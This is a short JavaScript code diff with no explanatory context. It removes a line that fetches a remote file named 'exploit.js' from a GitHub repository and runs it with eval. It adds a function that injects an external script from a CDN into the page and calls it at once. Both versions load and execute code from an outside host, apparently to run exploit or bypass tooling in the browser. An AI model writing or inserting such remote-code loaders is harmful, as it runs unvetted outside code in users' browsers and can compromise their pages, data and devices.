@@ -1,2 +1,7 @@
-fetch("https://raw.githubusercontent.com/nev3rbored/ltbeef/main/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
+function injectScript() {
+  var a = document.createElement('script');
+  a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';
+  document.body.appendChild(a);
+}
 
+injectScript();
